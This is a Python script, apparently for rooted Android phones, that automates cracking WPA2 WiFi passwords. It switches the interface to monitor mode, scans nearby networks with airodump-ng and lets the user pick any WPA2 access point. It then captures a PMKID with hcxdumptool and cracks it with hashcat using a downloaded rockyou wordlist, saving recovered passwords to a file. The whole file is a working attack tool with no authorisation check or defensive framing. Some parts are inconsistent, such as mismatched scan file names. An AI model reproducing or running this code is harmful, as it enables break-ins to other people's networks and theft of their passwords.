#!/usr/bin/env python3
# main.py - (NATIVE)
# NO USB ADAPTER • Native Root Monitor Mode • Standard Linux Tools
import subprocess, time, argparse, os, re, signal
from pathlib import Path
import threading

class RedmiWiFiCracker:
    def __init__(self):
        self.script_dir = Path(__file__).parent.absolute()
        self.wordlist = self.setup_wordlist()
        self.potfile = self.script_dir / "hashcat.potfile"
        self.iface = self.detect_iface()
        
    def detect_iface(self):
        """Auto detect Redmi WiFi interface"""
        # Fallback ke 'wlan0' jika iwconfig tidak terinstall, namun kita coba deteksi dulu
        try:
            result = subprocess.run("iwconfig 2>/dev/null", capture_output=True, text=True, shell=True)
            ifaces = re.findall(r'^(\w+)', result.stdout, re.MULTILINE)
            
            for iface in ifaces:
                if 'wlan' in iface or 'wlp' in iface:
                    print(f"✅ Detected: {iface}")
                    return iface
        except Exception as e:
            print(f"⚠️ Could not auto-detect: {e}")
            
        print("⚠️ Defaulting to wlan0 (Use --iface to change)")
        return "wlan0"
    
    def setup_wordlist(self):
        """Indo wordlist optimized"""
        wl = self.script_dir / "rockyou.txt"
        if not wl.exists():
            print("📥 Downloading optimized wordlist...")
            # Pastikan curl terinstall
            url = "https://raw.githubusercontent.com/OverH4shX/DarkCracker/main/rockyou.txt"
            subprocess.run(f"curl -L -o {wl} '{url}'", shell=True)
        return str(wl)
    
    def root_monitor_mode(self):
        """
        Native Monitor Mode using standard 'iw' (nl80211).
        TIDAK menggunakan modul Magisk / sysfs debug hacks.
        """
        print(f"[+] Enabling Native Monitor Mode: {self.iface}")
        
        # 1. Matikan proses yang mengganggu (wpa_supplicant)
        subprocess.run(f"su -c 'killall wpa_supplicant'", shell=True, stderr=subprocess.DEVNULL)
        subprocess.run(f"su -c 'killall dhclient'", shell=True, stderr=subprocess.DEVNULL)
        
        # 2. Matikan interface
        subprocess.run(f"su -c 'ip link set {self.iface} down'", shell=True)
        
        # 3. Set mode monitor (Standar Linux: iw dev <iface> set type monitor)
        # Perintah ini bekerja pada kernel yang mendukung nl80211 secara native
        ret = subprocess.run(f"su -c 'iw dev {self.iface} set type monitor'", shell=True, capture_output=True)
        
        # 4. Nyalakan interface
        subprocess.run(f"su -c 'ip link set {self.iface} up'", shell=True)
        
        # 5. Verifikasi
        time.sleep(1)
        result = subprocess.run(f"iw dev {self.iface} info", shell=True, capture_output=True, text=True)
        
        if "type monitor" in result.stdout:
            print("✅ MONITOR MODE ACTIVE (Native)!")
            return True
        else:
            # Cek fallback dengan iwconfig jika ada
            result_legacy = subprocess.run(f"iwconfig {self.iface}", shell=True, capture_output=True, text=True)
            if "Mode:Monitor" in result_legacy.stdout:
                 print("✅ MONITOR MODE ACTIVE (Legacy)!")
                 return True

            print("❌ Monitor Mode Failed!")
            print("   Reason: Kernel might restrict native monitor mode without drivers patches.")
            return False
    
    def quick_scan(self, duration=20):
        """Optimized airodump-ng scan"""
        print(f"[+] Scanning {duration}s...")
        scan_file = "redmi_scan"
        
        # Pastikan airodump-ng berjalan
        cmd = f"airodump-ng {self.iface} -w {scan_file} --output-format csv --write-interval 10"
        proc = subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid)
        
        def timeout_kill():
            time.sleep(duration)
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except:
                pass
        
        scan_thread = threading.Thread(target=timeout_kill)
        scan_thread.start()
        scan_thread.join()
        
        print("📡 Check scan-01.csv")
    
    def select_target(self):
        """Interactive BSSID/Channel selector"""
        print("\n🎯 TARGET SELECTION:")
        csv_file = "scan-01.csv"
        
        if not os.path.exists(csv_file):
            print("❌ Scan file not found!")
            exit(1)
            
        with open(csv_file, 'r') as f:
            lines = f.readlines()
        
        aps = []
        # Filter WPA2
        for line in lines[2:]:  
            parts = [p.strip() for p in line.split(',')]
            if len(parts) > 13 and parts[13] == 'WPA2':
                bssid = parts[0]
                essid = parts[-1].replace('"', '')
                channel = parts[3]
                if essid and essid != '<length 0>':
                    aps.append((bssid, channel, essid))
                    print(f"{len(aps)}. {essid} | {bssid} | CH{channel}")
        
        if not aps:
            print("❌ No WPA2 targets found.")
            exit(1)
            
        try:
            choice = int(input("Pilih target (1-{}): ".format(len(aps))) or 1) - 1
            return aps[choice]
        except:
            print("Invalid selection")
            exit(1)
    
    def pmkid_attack(self, bssid, channel, duration=120):
        """HCXDUMPTool optimized"""
        pcap = f"capture_{bssid.replace(':','_')}.pcapng"
        print(f"\n🔥 PMKID: {bssid} CH{channel} ({duration}s)")
        
        # Menggunakan hcxdumptool secara langsung via root
        # Pastikan hcxdumptool terinstall di termux
        cmd = f"su -c 'hcxdumptool -i {self.iface} --pmkid --enable_status=1 --channel={channel} --bssid={bssid} -o {pcap}'"
        
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            pass
        finally:
            subprocess.run("su -c 'pkill -f hcxdumptool'", shell=True)
            
        return pcap
    
    def extract_hash(self, pcap):
        """Hash extraction"""
        hc22000 = pcap.replace('.pcapng', '.hc22000')
        subprocess.run(f"hcxpcapngtool -o {hc22000} {pcap}", shell=True)
        
        if os.path.exists(hc22000) and os.path.getsize(hc22000) > 100:
            print(f"✅ Hash extracted: {hc22000}")
            return hc22000
        return None
    
    def hashcat_crack(self, hash_file):
        """Optimized hashcat for Mobile"""
        print(f"\n⚡ CRACKING: {hash_file}")
        print(f"📖 Wordlist: {self.wordlist}")
        
        # Optimasi performa untuk mobile (limit threads/workload jika perlu)
        cmd = f"hashcat -m 22000 '{hash_file}' '{self.wordlist}' --force --optimized-kernel-enable --status --status-timer=15"
        
        result = subprocess.run(cmd, shell=True)
        return result.returncode == 0
    
    def read_cracked_password(self):
        """Extract password from potfile"""
        if not self.potfile.exists():
            return None
        
        with open(self.potfile, 'r') as f:
            lines = f.readlines()
        
        for line in lines[-10:]:
            # Format hash:password
            parts = line.strip().split('*')
            if len(parts) > 1:
                pwd = parts[-1] # Password biasanya di bagian akhir setelah hash terakhir
                # Perbaiki regex sederhana jika format berbeda
                match = re.search(r'([a-f0-9]+)\*([a-f0-9]+)\*([a-f0-9]+)\*([a-f0-9]+)\*(.+)$', line.strip())
                if match:
                    pwd = match.group(5)
                    print(f"\n🎉 PASSWORD: '{pwd}'")
                    with open("cracked.txt", "a") as out:
                        out.write(f"{pwd}\n")
                    return pwd
        return None
    
    def cleanup(self):
        """Restore normal mode using 'iw'"""
        print("\n🧹 Cleanup...")
        # Kembalikan ke mode managed
        subprocess.run(f"su -c 'ip link set {self.iface} down'", shell=True)
        subprocess.run(f"su -c 'iw dev {self.iface} set type managed'", shell=True)
        subprocess.run(f"su -c 'ip link set {self.iface} up'", shell=True)
        
        # Restart service wifi (opsional, tergantung rom)
        # subprocess.run(f"su -c 'svc wifi enable'", shell=True)
        print("✅ Network restored (Managed Mode)")

def main():
    parser = argparse.ArgumentParser(description="🔥 Native WiFi Cracker")
    parser.add_argument("--iface", default="wlan0", help="WiFi interface")
    parser.add_argument("--duration", type=int, default=120, help="PMKID time")
    args = parser.parse_args()
    
    cracker = RedmiWiFiCracker()
    
    # Override iface if specified
    cracker.iface = args.iface
    
    try:
        if not cracker.root_monitor_mode():
            print("❌ Gagal masuk Monitor Mode.")
            print("💡 Pastikan: 1. Sudah Root. 2. Tools 'iw' & 'ip' terinstall.")
            print("   Jika tetap gagal, Kernel Stock mungkin memblokir Monitor Mode tanpa patch modul.")
            exit(1)
        
        cracker.quick_scan()
        bssid, channel, essid = cracker.select_target()
        
        print(f"\n🎯 Attacking: {essid}")
        pcap = cracker.pmkid_attack(bssid, channel, args.duration)
        
        if os.path.exists(pcap) and os.path.getsize(pcap) > 0:
            hash_file = cracker.extract_hash(pcap)
            
            if hash_file:
                cracker.hashcat_crack(hash_file)
                cracker.read_cracked_password()
            else:
                print("❌ No PMKID captured. Try longer duration.")
        else:
            print("❌ No pcap file created.")
            
    except KeyboardInterrupt:
        print("\n⚠️ Stopped by user")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        cracker.cleanup()

if __name__ == "__main__":
    print("🚀 CRACKER (No Magisk Module)")
    main()